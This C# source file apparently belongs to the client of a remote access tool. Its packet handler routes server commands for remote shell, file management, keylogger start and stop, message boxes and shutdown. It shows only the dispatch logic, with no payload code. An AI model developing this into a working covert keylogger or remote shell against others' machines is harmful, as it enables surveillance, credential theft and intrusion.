using System;
using System.Diagnostics.Contracts;
using System.Net.WebSockets;
using Common.Enums;
using Common.Networking;
using Common.Utils;

namespace Client.Networking
{
    public sealed class PacketHandler
    {
        private readonly Action<SystemInfoRequest> _onSystemInfoRequest;
        private readonly Action<RemoteShellRequest> _onRemoteShellRequest;
        private readonly Action<FileManagerRequest> _onFileManagerRequest;
        private readonly Action<KeyLoggerStart>? _onKeyLoggerStart;
        private readonly Action<KeyLoggerStop>? _onKeyLoggerStop;
        private readonly Action<KeyLoggerLangToggle>? _onKeyLoggerLangToggle;
        private readonly Action<MessageBoxRequest> _onMessageBoxRequest;
        private readonly Action<ShutdownActionRequest> _onShutdownActionRequest;

        public PacketHandler(Action<SystemInfoRequest> onSystemInfoRequest, Action<RemoteShellRequest> onRemoteShellRequest, Action<FileManagerRequest> onFileManagerRequest,Action<MessageBoxRequest> onMessageBoxRequest, Action<ShutdownActionRequest> onShutdownActionRequest, Action<KeyLoggerStart>? onKeyLoggerStart = null, Action<KeyLoggerStop>? onKeyLoggerStop = null, Action<KeyLoggerLangToggle>? onKeyLoggerLangToggle = null)
        {
            _onSystemInfoRequest = onSystemInfoRequest;
            _onRemoteShellRequest = onRemoteShellRequest;
            _onFileManagerRequest = onFileManagerRequest;
            _onKeyLoggerStart = onKeyLoggerStart;
            _onKeyLoggerStop = onKeyLoggerStop;
            _onKeyLoggerLangToggle = onKeyLoggerLangToggle;
            _onMessageBoxRequest = onMessageBoxRequest;
            _onShutdownActionRequest = onShutdownActionRequest;
        }

        public void HandleLine(string json)
        {
            try
            {
                var baseObj = JsonHelper.Deserialize<BasePacket>(json);
                if (baseObj == null) return;
                switch (baseObj.PacketType)
                {
                    case PacketType.SystemInfoRequest:
                        var req = JsonHelper.Deserialize<SystemInfoRequest>(json);
                        if (req != null)
                        {
                            _onSystemInfoRequest(req);
                        }
                        break;

                    case PacketType.RemoteShellRequest:
                        var shellReq = JsonHelper.Deserialize<RemoteShellRequest>(json);
                        if (shellReq != null)
                        {
                            _onRemoteShellRequest(shellReq);
                        }
                        break;

                    case PacketType.FileManagerRequest:
                        var fileReq = JsonHelper.Deserialize<FileManagerRequest>(json);
                        if (fileReq != null)
                        {
                            _onFileManagerRequest(fileReq);
                        }
                        break;

                    case PacketType.KeyLoggerStart:
                        var klStart = JsonHelper.Deserialize<KeyLoggerStart>(json);
                        if (klStart != null && _onKeyLoggerStart != null)
                        {
                            _onKeyLoggerStart(klStart);
                        }
                        break;

                    case PacketType.KeyLoggerStop:
                        var klStop = JsonHelper.Deserialize<KeyLoggerStop>(json);
                        if (klStop != null && _onKeyLoggerStop != null)
                        {
                            _onKeyLoggerStop(klStop);
                        }
                        break;

                    case PacketType.KeyLoggerLangToggle:
                        var klLang = JsonHelper.Deserialize<KeyLoggerLangToggle>(json);
                        if (klLang != null && _onKeyLoggerLangToggle != null)
                        {
                            _onKeyLoggerLangToggle(klLang);
                        }
                        break;
                    case PacketType.MessageBoxRequest:
                        var msgReq = JsonHelper.Deserialize<MessageBoxRequest>(json);
                        if (msgReq != null)
                        {
                            _onMessageBoxRequest(msgReq);
                        }
                        break;
                    case PacketType.ShutdownActionRequest:
                        var sdReq = JsonHelper.Deserialize<ShutdownActionRequest>(json);
                        if (sdReq != null)
                        {
                            _onShutdownActionRequest(sdReq);
                        }
                        break;
                    default:
                        break;
                }
            }
            catch (Exception)
            {
                // swallow for now or log via UI
            }
        }
    }
}


